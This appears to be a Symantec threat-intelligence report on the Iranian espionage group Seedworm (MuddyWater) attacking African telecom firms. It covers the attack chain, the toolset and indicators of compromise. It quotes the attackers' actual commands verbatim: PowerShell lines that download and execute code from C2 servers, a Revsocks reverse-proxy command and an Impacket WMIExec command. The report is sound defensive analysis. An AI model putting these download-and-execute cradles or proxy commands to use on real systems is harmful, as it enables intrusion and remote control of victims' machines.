    "plain_text": "Seedworm: Iranian Hackers Target Telecoms Orgs in\nNorth and East Africa\nsymantec-enterprise-blogs.security.com/blogs/threat-intelligence/iran-apt-seedworm-africa-telecoms\n\nIranian espionage group Seedworm (aka Muddywater) has been targeting organizations\noperating in the telecommunications sector in Egypt, Sudan, and Tanzania.\nSeedworm has been active since at least 2017, and has targeted organizations in many\ncountries, though it is most strongly associated with attacks on organizations in the Middle\nEast. It has been publicly stated that Seedworm is a cyberespionage group that is believed\nto be a subordinate part of Iran\u2019s Ministry of Intelligence and Security (MOIS).\nThe attackers used a variety of tools in this activity, which occurred in November 2023,\nincluding leveraging the MuddyC2Go infrastructure, which was recently discovered and\ndocumented by Deep Instinct. Researchers on Symantec\u2019s Threat Hunter Team, part of\nBroadcom, found a MuddyC2Go PowerShell launcher in the activity we investigated.\nThe attackers also use the SimpleHelp remote access tool and Venom Proxy, which have\npreviously been associated with Seedworm activity, as well as using a custom keylogging\ntool, and other publicly available and living-off-the-land tools.\n\nAttack Chain\nThe attacks in this campaign occurred in November 2023. Most of the activity we observed\noccurred on one telecommunications organization. The first evidence of malicious activity\nwas some PowerShell executions related to the MuddyC2Go backdoor.\nA MuddyC2Go launcher named \u201cvcruntime140.dll\u201d was saved in the folder\n\u201ccsidl_common_appdata\\javax\u201d, which seems to have been sideloaded by jabswitch.exe.\nJabswitch.exe is a legitimate Java Platform SE 8 executable.\nThe MuddyC2Go launcher executed the following PowerShell code to connect to its\ncommand-and-control (C&C) server:\ntppmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp;$tppmjy\nfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp=\"tppmjyfiqnqp\ntrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp\";$uri\n=\"http://95.164.38.99:443/HR5rOv8enEKonD4a0UdeGXD3xtxWix2Nf\";$response =\nInvoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop -usebasicparsing;iex\n$response.Content;\n\nIt appears that the variables at the beginning of the code are there for the purposes of\nattempting to bypass detection by security software, as they are unused and not relevant.\n1/6\n\nRight after this execution, attackers launched the MuddyC2Go malware using a scheduled\ntask that had previously been created:\n\"CSIDL_SYSTEM\\schtasks.exe\" /run /tn \"Microsoft\\Windows\\JavaX\\Java Autorun\"\n\nThe attackers also used some typical commands related to the Impacket WMIExec hacktool:\ncmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$\\__1698662615.0451615 2>&1\n\nThe SimpleHelp remote access tool was also leveraged, connecting to the 146.70.124[.]102\nC&C server. Further PowerShell stager execution also occurred, while the attacker also\nexecuted the Revsocks tool:\nCSIDL_COMMON_APPDATA\\do.exe -co 94.131.3.160:443 -pa super -q\n\nThe attackers also used a second legitimate remote access tool, AnyDesk, which was\ndeployed on the same computer as Revsocks and SimpleHelp, while PowerShell executions\nrelated to MuddyC2Go also occurred on the same machine:\n$uri =\"http://45.150.64.39:443/HJ3ytbqpne2tsJTEJi2D8s0hWo172A0aT\";$response =\nInvoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop -usebasicparsing;iex\n$response.Content;\n\nNotably, this organization is believed to have previously been infiltrated by Seedworm earlier\nin 2023. The primary activity of note during that intrusion was extensive use of SimpleHelp to\ncarry out a variety of activity, including:\nLaunching PowerShell\nLaunching a proxy tool\nDumping SAM hives\nUsing WMI to get drive info\nInstalling the JumpCloud remote access software\nDelivering proxy tools, a suspected LSASS dump tool, and a port scanner.\nDuring that intrusion, it\u2019s believed the attackers used WMI to launch the SimpleHelp installer\non the victim network. At the time, this activity couldn\u2019t be definitively linked to Seedworm,\nbut this subsequent activity appears to show that the earlier activity was carried out by the\nsame group of attackers.\nIn another telecommunications and media company targeted by the attackers, multiple\nincidents of SimpleHelp were used to connect to known Seedworm infrastructure. A custom\nbuild of the Venom Proxy hacktool was also executed on this network, as well as the new\ncustom keylogger used by the attackers in this activity.\n\n2/6\n\nIn the third organization targeted, Venom Proxy was also used, in addition to AnyDesk and\nsuspicious Windows Scripting Files (WSF) that have been associated with Seedworm activity\nin the past.\n\nToolset\nThe most interesting part of the toolset used in this activity is probably the presence of the\nMuddyC2Go launcher, which was sideloaded by jabswitch.exe.\nThe malware reads the C&C URL from the Windows registry value \u201cEnd\u201d stored inside the\nkey \u201cHKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\Tcpip\u201d. The URL path is read from the\n\u201cStatus\u201d value in the same aforementioned key.\nLastly, the MuddyC2GO launcher executes the following PowerShell command to contact its\nC&C server and execute the PowerShell code received:\npowershell.exe -c $uri ='{C2_URI}';$response = Invoke-WebRequest UseBasicParsing -Uri $uri -Method GET -ErrorAction Stop;Write-Output\n$response.Content;iex $response.Content;\n\nThe MuddyC2Go framework was first publicly written about in a blog published by Deep\nInstinct researchers on November 8, 2023. That blog documented its use in attacks on\norganizations in countries in the Middle East. The researchers said the framework may have\nbeen used by Seedworm since 2020. They also said that the framework, which is written in\nGo, has replaced Seedworm\u2019s previous PhonyC2 C&C infrastructure. This replacement\nappears to have occurred after the PhonyC2 source code was leaked earlier in 2023. The full\ncapabilities of MuddyC2Go are not yet known, but the executable contains an embedded\nPowerShell script that automatically connects to Seedworm\u2019s C&C server, which eliminates\nthe need for manual execution by an operator and gives the attackers remote access to a\nvictim machine. Deep Instinct said it was able to link MuddyC2Go to attacks dating back to\n2020 due to the unique URL patterns generated by the framework. It also said that the\nMuddyC2Go servers it observed were hosted at \u201cStark Industries\u201d, which is a VPS provider\nthat is known to host malicious activity.\nOther tools of note used in this activity included SimpleHelp, which is a legitimate remote\ndevice control and management tool, for persistence on victim machines. SimpleHelp is\nbelieved to have been used in attacks carried out by Seedworm since at least July 2022.\nOnce installed on a victim device, SimpleHelp can constantly run as a system service, which\nmakes it possible for attackers to gain access to the user\u2019s device at any point in time, even\nafter a reboot. SimpleHelp also allows attackers to execute commands on a device with\nadministrator privileges. SimpleHelp is now strongly associated with Seedworm activity and\nthe tool is installed on several of Seedworm\u2019s servers.\n\n3/6\n\nVenom Proxy is a publicly available tool that is described as \u201ca multi-hop proxy tool\ndeveloped for penetration testers.\u201d It is written in Go. It can be used to easily proxy network\ntraffic to a multi-layer intranet, and easily manage intranet nodes. It has been associated with\nSeedworm since at least mid-2022, with Microsoft describing it as Seedworm\u2019s \u201ctool of\nchoice\u201d in an August 2022 blog. Seedworm tends to use a custom build of Venom Proxy in\nits activity.\nOther tools used in this activity include:\nRevsocks - A cross-platform SOCKS5 proxy server program/library written in C that\ncan also reverse itself over a firewall.\nAnyDesk - A legitimate remote desktop application. It and similar tools are often used\nby attackers to obtain remote access to computers on a network.\nPowerShell - Seedworm makes heavy use of PowerShell, as well as PowerShellbased tools and scripts in its attacks. PowerShell is a Microsoft scripting tool that can\nbe used to run commands, download payloads, traverse compromised networks, and\ncarry out reconnaissance.\nCustom keylogger\n\nConclusion\nSeedworm has long had an interest in telecommunications organizations, as do many\ngroups engaged in cyberespionage activities. However, its strong focus on African\norganizations in this campaign is notable as, while it has been known to target organizations\nin Africa in the past, it does generally primarily focus on organizations in countries in the\nMiddle East. That one of the victim organizations in this campaign is based in Egypt is also\nof note given Egypt\u2019s proximity to Israel, a frequent target of Seedworm.\nSeedworm appears to remain focused on using a wide array of living-off-the-land and\npublicly available tools in its attack chains, no doubt in an effort to remain undetected on\nvictim networks for as long as possible. However, its recent more wide adoption of new C&C\ninfrastructure in the form of MuddyC2Go is notable and shows that the group continues to\ninnovate and develop its toolset when required in order to keep its activity under the radar.\nWhile the group uses a lot of living-off-the-land and publicly available tools, it is also capable\nof developing its own custom tools, such as the custom build of Venom Proxy and the\ncustom keylogger used in this campaign. The group still makes heavy use of PowerShell and\nPowerShell-related tools and scripts, underlining the need for organizations to be aware of\nsuspicious use of PowerShell on their networks.\nThe activity observed by Symantec\u2019s Threat Hunter Team took place in November 2023,\nshowing that Seedworm is very much a currently active threat faced by organizations that\nmay be of strategic interest to Iranian threat actors.\n\n4/6\n\nProtection/Mitigation\nFor the latest protection updates, please visit the Symantec Protection Bulletin.\n\nIndicators of Compromise\nIf an IOC is malicious and the file available to us, Symantec Endpoint products will detect\nand block that file.\n\nFile Indicators\n1a0827082d4b517b643c86ee678eaa53f85f1b33ad409a23c50164c3909fdaca \u2013\nMuddyC2Go DLL launcher\n25b985ce5d7bf15015553e30927691e7673a68ad071693bf6d0284b069ca6d6a \u2013 Benign\nJava(TM) Platform SE 8 executable used for sideloading MuddyC2Go DLL\neac8e7989c676b9a894ef366357f1cf8e285abde083fbdf92b3619f707ce292f \u2013 Custom\nkeylogger\n3916ba913e4d9a46cfce437b18735bbb5cc119cc97970946a1ac4eab6ab39230 \u2013 Venom\nProxy\n\nNetwork Indicators\n146.70.124[.]102 \u2013 SimpleHelp C&C server\n94.131.109[.]65 \u2013 MuddyC2Go C&C server\n95.164.38[.]99 \u2013MuddyC2Go C&C server\n45.67.230[.]91 \u2013 MuddyC2Go C&C server\n95.164.46[.]199 \u2013 MuddyC2Go C&C server\n94.131.98[.]14 \u2013 MuddyC2Go C&C server\n94.131.3[.]160 \u2013 GoSOCKS5proxy C&C server\n\nAbout the Author\nThreat Hunter Team\nSymantec\n\n5/6\n\nThe Threat Hunter Team is a group of security experts within Symantec whose mission is to\ninvestigate targeted attacks, drive enhanced protection in Symantec products, and offer\nanalysis that helps customers respond to attacks.\n\n6/6",
